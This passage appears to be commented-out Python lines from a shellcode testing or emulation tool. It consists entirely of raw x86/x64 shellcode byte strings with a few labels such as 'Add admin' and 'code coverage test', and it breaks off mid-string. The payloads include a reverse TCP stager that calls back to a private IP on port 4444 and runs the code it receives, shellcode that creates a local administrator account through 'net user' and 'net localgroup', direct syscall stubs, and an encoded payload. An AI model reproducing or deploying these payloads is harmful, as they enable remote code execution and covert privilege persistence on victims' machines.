    # code = b"\xEB\x5E\x6A\x30\x5E\x64\x8B\x06\x8B\x40\x0C\x8B\x70\x1C\xAD\x96\xAD\x8B\x78\x08\xC3\x60\x89\xFD\x8B\x45\x3C\x8B\x7C\x05\x78\x01\xEF\x8B\x4F\x18\x8B\x5F\x20\x01\xEB\xE3\x33\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xFC\xAC\x84\xC0\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x3B\x54\x24\x28\x75\xE2\x8B\x5F\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5F\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24\x1C\x61\xC3\x83\xEC\x14\xE8\x9A\xFF\xFF\xFF\x31\xDB\x53\x68\x50\x77\x6E\x64\x54\x5B\x89\x5D\xFC\x31\xDB\x53\x68\x72\x6C\x64\x21\x68\x6F\x20\x77\x6F\x68\x48\x65\x6C\x6C\x54\x5B\x89\x5D\xF8\x31\xDB\x53\x68\x2E\x64\x6C\x6C\x68\x65\x72\x33\x32\x66\xBB\x75\x73\x66\x53\x54\x5B\x68\x8E\x4E\x0E\xEC\x57\xE8\x69\xFF\xFF\xFF\x53\xFF\xD0\x89\x45\xF4\x68\xAA\xFC\x0D\x7C\x57\xE8\x58\xFF\xFF\xFF\x31\xDB\x53\x68\x42\x6F\x78\x41\x68\x73\x61\x67\x65\xBB\x7A\x23\x0B\x1D\x81\xF3\x7A\x6E\x6E\x6E\x53\x89\xE3\x43\x53\x8B\x5D\xF4\x53\xFF\xD0\x89\x45\xF0\x8B\x45\xF0\x31\xDB\x53\x8B\x5D\xF8\x53\x8B\x5D\xFC\x53\x31\xDB\x53\xFF\xD0\x68\x7E\xD8\xE2\x73\x57\xE8\x14\xFF\xFF\xFF\x31\xC9\x51\xFF\xD0"
    # code = b"\xE8\xA7\x00\x00\x00\x60\x31\xD2\x64\x8B\x52\x30\x90\x8B\x52\x0C\x90\x8B\x52\x14\x90\x89\xE5\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x90\x90\x31\xC0\xAC\x90\x90\x90\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEC\x52\x57\x8B\x52\x10\x90\x90\x8B\x42\x3C\x90\x01\xD0\x8B\x40\x78\x90\x85\xC0\x74\x58\x01\xD0\x8B\x58\x20\x90\x01\xD3\x50\x8B\x48\x18\x90\x85\xC9\x74\x46\x49\x31\xFF\x8B\x34\x8B\x01\xD6\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x90\x90\x75\xDE\x58\x8B\x58\x24\x90\x90\x01\xD3\x66\x8B\x0C\x4B\x90\x8B\x58\x1C\x90\x90\x01\xD3\x8B\x04\x8B\x90\x90\x01\xD0\x89\x44\x24\x24\x90\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xE9\x6B\xFF\xFF\xFF\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x90\x90\x54\x90\x90\x68\x4C\x77\x26\x07\x90\x90\x89\xE8\x90\x90\xFF\xD0\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x0A\x68\xC0\xA8\x00\x81\x90\x68\x02\x00\x11\x5C\x89\xE6\x50\x90\x90\x50\x90\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0A\xFF\x4E\x08\x75\xEC\xE8\x64\x00\x00\x00\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7E\x36\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7D\x25\x58\x68\x00\x40\x00\x00\x6A\x00\x50\x68\x0B\x2F\x0F\x30\xFF\xD5\x57\x68\x75\x6E\x4D\x61\xFF\xD5\x5E\x5E\xFF\x0C\x24\x0F\x85\x6C\xFF\xFF\xFF\xEB\x9E\x01\xC3\x29\xC6\x75\xC4\xC3\xBB\xF0\xB5\xA2\x56\x6A\x00\x53\xFF\xD5"
    # code = b"\x83\xEC\x08\x31\xC0\x50\x50\x50\x50\x6A\xFF\x50\x68\xFF\x0F\x1F\x00\x8D\x5D\xFC\x53\xB8\x9F\x00\x00\x00\x31\xC9\x8D\x14\x24\x64\xFF\x15\xC0\x00\x00\x00"
    # code = b"\xEB\x5E\x6A\x30\x5E\x64\x8B\x06\x8B\x40\x0C\x8B\x70\x1C\xAD\x96\xAD\x8B\x78\x08\xC3\x60\x89\xFD\x8B\x45\x3C\x8B\x7C\x05\x78\x01\xEF\x8B\x4F\x18\x8B\x5F\x20\x01\xEB\xE3\x33\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xFC\xAC\x84\xC0\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x3B\x54\x24\x28\x75\xE2\x8B\x5F\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5F\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24\x1C\x61\xC3\x83\xEC\x14\xE8\x9A\xFF\xFF\xFF\x31\xDB\x53\x68\x50\x77\x6E\x64\x54\x5B\x89\x5D\xFC\x31\xDB\x53\x68\x72\x6C\x64\x21\x68\x6F\x20\x77\x6F\x68\x48\x65\x6C\x6C\x54\x5B\x89\x5D\xF8\x31\xDB\x53\x68\x2E\x64\x6C\x6C\x68\x65\x72\x33\x32\x66\xBB\x75\x73\x66\x53\x54\x5B\x68\x8E\x4E\x0E\xEC\x57\xE8\x69\xFF\xFF\xFF\x53\xFF\xD0\x89\x45\xF4\x68\xAA\xFC\x0D\x7C\x57\xE8\x58\xFF\xFF\xFF\x31\xDB\x53\x68\x42\x6F\x78\x41\x68\x73\x61\x67\x65\xBB\x7A\x23\x0B\x1D\x81\xF3\x7A\x6E\x6E\x6E\x53\x89\xE3\x43\x53\x8B\x5D\xF4\x53\xFF\xD0\x89\x45\xF0\x8B\x45\xF0\x31\xDB\x53\x8B\x5D\xF8\x53\x8B\x5D\xFC\x53\x31\xDB\x53\xFF\xD0\x68\x7E\xD8\xE2\x73\x57\xE8\x14\xFF\xFF\xFF\x31\xC9\x51\xFF\xD0"
    # code = b"\xE8\xA7\x00\x00\x00\x60\x31\xD2\x64\x8B\x52\x30\x90\x8B\x52\x0C\x90\x8B\x52\x14\x90\x89\xE5\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x90\x90\x31\xC0\xAC\x90\x90\x90\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEC\x52\x57\x8B\x52\x10\x90\x90\x8B\x42\x3C\x90\x01\xD0\x8B\x40\x78\x90\x85\xC0\x74\x58\x01\xD0\x8B\x58\x20\x90\x01\xD3\x50\x8B\x48\x18\x90\x85\xC9\x74\x46\x49\x31\xFF\x8B\x34\x8B\x01\xD6\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x90\x90\x75\xDE\x58\x8B\x58\x24\x90\x90\x01\xD3\x66\x8B\x0C\x4B\x90\x8B\x58\x1C\x90\x90\x01\xD3\x8B\x04\x8B\x90\x90\x01\xD0\x89\x44\x24\x24\x90\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xE9\x6B\xFF\xFF\xFF\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x90\x90\x54\x90\x90\x68\x4C\x77\x26\x07\x90\x90\x89\xE8\x90\x90\xFF\xD0\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x0A\x68\xC0\xA8\x00\x81\x90\x68\x02\x00\x11\x5C\x89\xE6\x50\x90\x90\x50\x90\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0A\xFF\x4E\x08\x75\xEC\xE8\x64\x00\x00\x00\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7E\x36\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7D\x25\x58\x68\x00\x40\x00\x00\x6A\x00\x50\x68\x0B\x2F\x0F\x30\xFF\xD5\x57\x68\x75\x6E\x4D\x61\xFF\xD5\x5E\x5E\xFF\x0C\x24\x0F\x85\x6C\xFF\xFF\xFF\xEB\x9E\x01\xC3\x29\xC6\x75\xC4\xC3\xBB\xF0\xB5\xA2\x56\x6A\x00\x53\xFF\xD5"
    # code = b"\x83\xEC\x08\x31\xC0\x50\x50\x50\x50\x6A\xFF\x50\x68\xFF\x0F\x1F\x00\x8D\x5D\xFC\x53\xB8\xB9\x00\x00\x00\xE8\x02\x00\x00\x00\xEB\x08\x64\xFF\x15\xC0\x00\x00\x00\xC3"
    # code = b"\x6A\x00\x6A\xFF\xB8\x2C\x00\x07\x00\xE8\x02\x00\x00\x00\xEB\x08\x64\xFF\x15\xC0\x00\x00\x00\xC3"
    # code = b"\x83\xEC\x2A\x31\xC0\x66\x50\x68\x75f\x00\x6E\x00\x68\x5C\x00\x52\x00\x68\x6F\x00\x6E\x00\x68\x73\x00\x69\x00\x68\x65\x00\x72\x00\x68\x74\x00\x56\x00\x68\x65\x00\x6E\x00\x68\x72\x00\x72\x00\x68\x43\x00\x75\x00\x68\x73\x00\x5C\x00\x68\x6F\x00\x77\x00\x68\x6E\x00\x64\x00\x68\x57\x00\x69\x00\x68\x74\x00\x5C\x00\x68\x6F\x00\x66\x00\x68\x6F\x00\x73\x00\x68\x63\x00\x72\x00\x68\x4D\x00\x69\x00\x68\x65\x00\x5C\x00\x68\x61\x00\x72\x00\x68\x74\x00\x77\x00\x68\x6F\x00\x66\x00\x68\x5C\x00\x53\x00\x68\x6E\x00\x65\x00\x68\x68\x00\x69\x00\x68\x61\x00\x63\x00\x68\x5C\x00\x4D\x00\x68\x72\x00\x79\x00\x68\x73\x00\x74\x00\x68\x67\x00\x69\x00\x68\x52\x00\x65\x00\x31\xDB\xB3\x5C\x66\x53\x89\xE3\x66\xC7\x45\xD4\x7E\x00\x66\xC7\x45\xD6\x80\x00\x89\x5D\xD8\x8D\x7D\xD4\xC7\x45\xE0\x18\x00\x00\x00\xC7\x45\xE4\x00\x00\x00\x00\x89\x7D\xE8\xC7\x45\xEC\x40\x00\x00\x00\xC7\x45\xF0\x00\x00\x00\x00\xC7\x45\xF4\x00\x00\x00\x00\x8D\x5D\xE0\x53\x68\x00\x00\x00\x80\xC7\x45\xF8\x00\x00\x00\x00\x8D\x5D\xF8\x53\xB8\x12\x00\x00\x00\xE8\x02\x00\x00\x00\xEB\x08\x64\xFF\x15\xC0\x00\x00\x00\xC3"
    # code = b"\x6A\x00\x6A\x04\xC7\x45\xF8\xFF\xFF\xFF\xFF\x8D\x5D\xF8\x53\x50\xFF\x75\xFC\xB8\x3A\x00\x00\x00\xE8\x02\x00\x00\x00\xEB\x08\x64\xFF\x15\xC0\x00\x00\x00\xC3"
    # code = b"\xda\xde\xd9\x74\x24\xf4\xb8\x22\xd2\x27\x7a\x29\xc9\xb1\x4b\x5b\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2\xd7\x3b\xbc\x7a\x17\xbc\x95\x4b\xd7\xd8\x92\xec\xe7\xa5\x65\x94\x08\x2d\x25\x69\x9d\x41\xba\xdc\x2a\xe1\xca\xf7\x25\xe2\xca\x07\xbe\xa2\xfe\x8a\x80\x5e\x74\xd4\x3c\xc1\x49\xb5\xb7\x91\x69\x12\x4c\x2c\x4e\xd1\x06\xaa\xd6\xe4\x4c\x3f\x6c\xff\x1b\x1a\x51\xfe\xf0\x78\xa5\x49\x8d\x4b\x4d\x48\x7f\x82\xae\x7a\xbf\x19\xfc\xf9\xff\x96\xfa\xc0\x30\x5b\x04\x04\x25\x90\x3d\xf6\x9d\x71\x37\xe7\x56\xdb\x93\xe6\x83\xba\x50\xe4\x18\xc8\x3d\xe9\x9f\x25\x4a\x15\x14\xb8\xa5\x9f\x6e\x9f\x29\xc1\xad\x72\x01\x53\xd9\x27\x5d\xac\xe6\xb1\xa5\xd2\xdc\xca\xa9\xd4\xdc\x4b\x6e\xd0\xdc\x4b\x71\xe0\x12\x3e\x97\xd1\x42\xd8\x57\xd6\x92\x43\xa9\x5c\x9c\x0d\x8e\x83\xd3\x70\xc2\x4c\x13\x73\x1b\xc4\xf6\x9b\x43\x29\x07\xa4\xfd\x17\x1c\xb9\xa0\x1a\x9f\x3a\xd4\xd4\xde\x82\xee\x16\xe0\x04\x07\xa0\x1f\xfb\x28\x26\xd1\x5f\xe6\x79\xbd\x0c\xf7\x2f\x39\x82\xc7\x80\xbe\xb1\xcf\xc8\xad\xc5\x2f\xf7\x4e\x57\xb4\x26\xf5\xdf\x51\x17\xda\x7c\xba\x39\x41\xf7\x9a\xb0\xfa\x92\xa8\x1a\x8f\x39\x2e\x2e\x06\xa6\x80\xf0\xb5\x16\x8f\x9b\x65\x78\x2e\x38\x01\xa6\x96\xe6\xe9\xc8\xb3\x92\xc9\x78\x53\x38\x68\xed\xcc\xcc\x05\x98\x62\x11\xb8\x06\xee\x38\x54\xae\x83\xce\xda\x51\x10\x40\x68\xe1\xf8\xed\xe9\x66\x8c\x78\x95\x58\x4e\x54\x34\xfd\xea\xaa"
    # code = b"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7"
    # code = b"\x31\xc0\x50\xb8\x41\x41\x41\x64\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x6d\x76\x53\x52\xba\x4d\x59\x32\x36\x31\xd1\x51\xb9\x6e\x72\x61\x71\xba\x4e\x33\x2d\x38\x31\xd1\x51\xb9\x6c\x75\x78\x78\xba\x4c\x34\x34\x31\x31\xd1\x51\xb9\x46\x47\x57\x46\xba\x33\x34\x32\x34\x31\xd1\x51\xb9\x56\x50\x47\x64\xba\x38\x35\x33\x44\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x01\x41\x60\x32\xba\x48\x61\x4f\x53\x31\xd1\x51\xb9\x28\x47\x0d\x2f\xba\x5b\x67\x4c\x63\x31\xd1\x51\xb9\x03\x24\x36\x21\xba\x62\x50\x59\x53\x31\xd1\x51\xb9\x34\x41\x15\x18\xba\x5d\x32\x61\x6a\x31\xd1\x51\xb9\x0c\x05\x1b\x25\xba\x68\x68\x72\x4b\x31\xd1\x51\xb9\x2f\x27\x7b\x13\xba\x5a\x57\x5b\x52\x31\xd1\x51\xb9\x1c\x2c\x02\x3e\xba\x70\x4b\x70\x51\x31\xd1\x51\xb9\x3d\x2a\x32\x4c\xba\x51\x45\x51\x2d\x31\xd1\x51\xb9\x23\x5c\x1c\x19\xba\x4d\x39\x68\x39\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x02\x63\x6b\x35\xba\x4b\x43\x44\x54\x31\xd1\x51\xb9\x61\x55\x6c\x3d\xba\x43\x75\x2d\x71\x31\xd1\x51\xb9\x27\x3f\x3b\x1a\xba\x54\x5a\x49\x69\x31\xd1\x51\xb9\x25\x34\x12\x67\xba\x4a\x44\x32\x32\x31\xd1\x51\xb9\x0b\x02\x1f\x19\xba\x6e\x71\x74\x6d\x31\xd1\x51\xb9\x39\x3f\x7b\x15\xba\x4d\x5a\x5b\x51\x31\xd1\x51\xb9\x35\x15\x03\x2a\xba\x67\x70\x6e\x45\x31\xd1\x51\xb9\x3a\x17\x75\x46\xba\x6f\x47\x55\x64\x31\xd1\x51\xb9\x26\x35\x0b\x1e\xba\x6a\x72\x59\x51\x31\xd1\x51\xb9\x2a\x2a\x06\x2a\xba\x66\x65\x45\x6b\x31\xd1\x51\xb9\x1d\x20\x35\x5a\xba\x53\x65\x61\x7a\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb9\x09\x4c\x7c\x5e\xba\x38\x6c\x53\x38\x31\xd1\x51\xb9\x42\x4d\x39\x14\xba\x62\x62\x5d\x34\x31\xd1\x51\xb9\x7a\x24\x26\x75\xba\x2d\x6b\x74\x31\x31\xd1\x51\xb9\x1d\x30\x15\x28\xba\x58\x77\x4a\x6c\x31\xd1\x51\xb9\x7c\x2f\x57\x16\xba\x53\x5b\x77\x44\x31\xd1\x51\xb9\x42\x25\x2a\x66\xba\x2d\x4b\x59\x46\x31\xd1\x51\xb9\x28\x2f\x0c\x5a\xba\x4d\x4c\x78\x33\x31\xd1\x51\xb9\x20\x2b\x26\x26\xba\x63\x44\x48\x48\x31\xd1\x51\xb9\x08\x2b\x23\x67\xba\x66\x52\x77\x34\x31\xd1\x51\xb9\x49\x1c\x2e\x48\xba\x69\x7a\x6a\x2d\x31\xd1\x51\xb9\x67\x67\x1d\x37\xba\x45\x47\x32\x41\x31\xd1\x51\xb9\x03\x33\x0d\x3b\xba\x71\x45\x68\x49\x31\xd1\x51\xb9\x39\x6a\x3c\x2f\xba\x55\x4a\x6f\x4a\x31\xd1\x51\xb9\x37\x44\x1f\x2e\xba\x5a\x2d\x71\x4f\x31\xd1\x51\xb9\x34\x23\x23\x3b\xba\x68\x77\x46\x49\x31\xd1\x51\xb9\x07\x3a\x0a\x14\xba\x73\x48\x65\x78\x31\xd1\x51\xb9\x14\x2e\x58\x53\xba\x48\x6d\x37\x3d\x31\xd1\x51\xb9\x3e\x3d\x26\x32\xba\x52\x6e\x43\x46\x31\xd1\x51\xb9\x33\x3c\x35\x34\xba\x5d\x48\x47\x5b\x31\xd1\x51\xb9\x36\x0e\x07\x2b\xba\x58\x7a\x44\x44\x31\xd1\x51\xb9\x3c\x10\x0a\x37\xba\x49\x62\x78\x52\x31\xd1\x51\xb9\x24\x7c\x3b\x36\xba\x61\x31\x67\x75\x31\xd1\x51\xb9\x31\x3d\x3b\x27\xba\x62\x64\x68\x73\x31\xd1\x51\xb9\x7f\x7d\x3d\x35\xba\x36\x33\x78\x69\x31\xd1\x51\xb9\x7c\x13\x0f\x2f\xba\x31\x52\x4c\x67\x31\xd1\x51\xb9\x1b\x08\x35\x2d\xba\x58\x49\x79\x72\x31\xd1\x51\xb9\x74\x3a\x1e\x21\xba\x2d\x65\x52\x6e\x31\xd1\x51\xb9\x16\x10\x1f\x17\xba\x34\x58\x54\x52\x31\xd1\x51\xb9\x2f\x27\x0c\x6e\xba\x4e\x43\x68\x4e\x31\xd1\x51\xb9\x39\x22\x5e\x50\xba\x4b\x47\x39\x70\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x65\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x1e\x53\x39\x3c\xba\x6d\x32\x5b\x50\x31\xd1\x51\xb9\x04\x66\x2f\x32\xba\x61\x46\x4b\x5b\x31\xd1\x51\xb9\x19\x1e\x0d\x11\xba\x69\x73\x62\x75\x31\xd1\x51\xb9\x20\x41\x47\x36\xba\x45\x35\x67\x59\x31\xd1\x51\xb9\x2b\x05\x64\x2a\xba\x47\x69\x44\x59\x31\xd1\x51\xb9\x10\x3f\x4f\x22\xba\x62\x5a\x38\x43\x31\xd1\x51\xb9\x2a\x6f\x2a\x24\xba\x42\x4f\x4c\x4d\x31\xd1\x51\xb9\x29\x09\x1e\x5e\xba\x47\x6c\x6a\x2d\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x6f\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x72\x2a\x05\x39\xba\x52\x4b\x70\x4d\x31\xd1\x51\xb9\x54\x3a\x05\x52\xba\x35\x48\x71\x6f\x31\xd1\x51\xb9\x29\x16\x0a\x47\xba\x4c\x36\x79\x33\x31\xd1\x51\xb9\x27\x1b\x5b\x3e\xba\x55\x6d\x32\x5d\x31\xd1\x51\xb9\x33\x1a\x3b\x10\xba\x41\x77\x48\x75\x31\xd1\x51\xb9\x34\x79\x3a\x12\xba\x53\x59\x4e\x77\x31\xd1\x51\xb9\x1d\x5c\x1e\x28\xba\x72\x32\x78\x41\x31\xd1\x51\xb9\x2a\x4e\x5a\x28\xba\x59\x2d\x7a\x4b\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\xbb\xf9\x7e\x5e\x22\xba\x36\x54\x3d\x54\x31\xd3\xff\xd3"
    # code = b"\x83\xEC\x08\x31\xC0\x50\x50\x50\x50\x6A\xFF\x50\x68\xFF\x0F\x1F\x00\x8D\x5D\xFC\x53\xB8\xB9\x00\x00\x00\xE8\x02\x00\x00\x00\xEB\x08\x64\xFF\x15\xC0\x00\x00\x00\xC3"
    # VA shellcode
    # code = b"\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x05\x00\x00\x68\x00\x00\x00\x24\xE8\x48\x3D\x26\x02"
    # code coverage test
    # code = b"\xB8\x01\x00\x00\x00\x85\xC0\x74\x1B\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE3\x41\x51\x53\xE8\x19\x58\x2E\x02\x83\xC4\x0C\xC3\x6A\x00\x68\x00\x00\x00\x12\xE8\x2A\xFD\x27\x02\xC3"
    # code coverage test 2
    # code = b"\xB8\x00\x00\x00\x00\x85\xC0\x74\x3E\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE3\x41\x51\x53\xE8\x19\x58\x2E\x02\x83\xC4\x0C\xB8\x00\x00\x00\x00\x85\xC0\x74\x1B\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE3\x41\x51\x53\xE8\xF6\x57\x2E\x02\x83\xC4\x0C\xC3\x6A\x00\xE8\x12\x9F\x26\x02\xC3"
    # code = b"\xB8\x01\x00\x00\x00\x85\xC0\x74\x3E\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE3\x41\x51\x53\xE8\x19\x58\x2E\x02\x83\xC4\x0C\xB8\x00\x00\x00\x00\x85\xC0\x74\x1B\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE3\x41\x51\x53\xE8\xF6\x57\x2E\x02\x83\xC4\x0C\xC3\x6A\x00\xE8\x12\x9F\x26\x02\xC3"
    # code = b"\xB8\x00\x00\x00\x00\x85\xC0\x74\x18\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE3\x41\x51\x53\xE8\x1B\x58\x2E\x02\xC3\x6A\x00\x68\x00\x00\x00\x12\xE8\x2D\xFD\x27\x02\xC3"

    # x64
    # Add admin
    # code = b"\x31\xc0\x50\xb8\x41\x41\x41\x64\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x6d\x76\x53\x52\xba\x4d\x59\x32\x36\x31\xd1\x51\xb9\x6e\x72\x61\x71\xba\x4e\x33\x2d\x38\x31\xd1\x51\xb9\x6c\x75\x78\x78\xba\x4c\x34\x34\x31\x31\xd1\x51\xb9\x46\x47\x57\x46\xba\x33\x34\x32\x34\x31\xd1\x51\xb9\x56\x50\x47\x64\xba\x38\x35\x33\x44\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x01\x41\x60\x32\xba\x48\x61\x4f\x53\x31\xd1\x51\xb9\x28\x47\x0d\x2f\xba\x5b\x67\x4c\x63\x31\xd1\x51\xb9\x03\x24\x36\x21\xba\x62\x50\x59\x53\x31\xd1\x51\xb9\x34\x41\x15\x18\xba\x5d\x32\x61\x6a\x31\xd1\x51\xb9\x0c\x05\x1b\x25\xba\x68\x68\x72\x4b\x31\xd1\x51\xb9\x2f\x27\x7b\x13\xba\x5a\x57\x5b\x52\x31\xd1\x51\xb9\x1c\x2c\x02\x3e\xba\x70\x4b\x70\x51\x31\xd1\x51\xb9\x3d\x2a\x32\x4c\xba\x51\x45\x51\x2d\x31\xd1\x51\xb9\x23\x5c\x1c\x19\xba\x4d\x39\x68\x39\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x02\x63\x6b\x35\xba\x4b\x43\x44\x54\x31\xd1\x51\xb9\x61\x55\x6c\x3d\xba\x43\x75\x2d\x71\x31\xd1\x51\xb9\x27\x3f\x3b\x1a\xba\x54\x5a\x49\x69\x31\xd1\x51\xb9\x25\x34\x12\x67\xba\x4a\x44\x32\x32\x31\xd1\x51\xb9\x0b\x02\x1f\x19\xba\x6e\x71\x74\x6d\x31\xd1\x51\xb9\x39\x3f\x7b\x15\xba\x4d\x5a\x5b\x51\x31\xd1\x51\xb9\x35\x15\x03\x2a\xba\x67\x70\x6e\x45\x31\xd1\x51\xb9\x3a\x17\x75\x46\xba\x6f\x47\x55\x64\x31\xd1\x51\xb9\x26\x35\x0b\x1e\xba\x6a\x72\x59\x51\x31\xd1\x51\xb9\x2a\x2a\x06\x2a\xba\x66\x65\x45\x6b\x31\xd1\x51\xb9\x1d\x20\x35\x5a\xba\x53\x65\x61\x7a\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\xb9\x09\x4c\x7c\x5e\xba\x38\x6c\x53\x38\x31\xd1\x51\xb9\x42\x4d\x39\x14\xba\x62\x62\x5d\x34\x31\xd1\x51\xb9\x7a\x24\x26\x75\xba\x2d\x6b\x74\x31\x31\xd1\x51\xb9\x1d\x30\x15\x28\xba\x58\x77\x4a\x6c\x31\xd1\x51\xb9\x7c\x2f\x57\x16\xba\x53\x5b\x77\x44\x31\xd1\x51\xb9\x42\x25\x2a\x66\xba\x2d\x4b\x59\x46\x31\xd1\x51\xb9\x28\x2f\x0c\x5a\xba\x4d\x4c\x78\x33\x31\xd1\x51\xb9\x20\x2b\x26\x26\xba\x63\x44\x48\x48\x31\xd1\x51\xb9\x08\x2b\x23\x67\xba\x66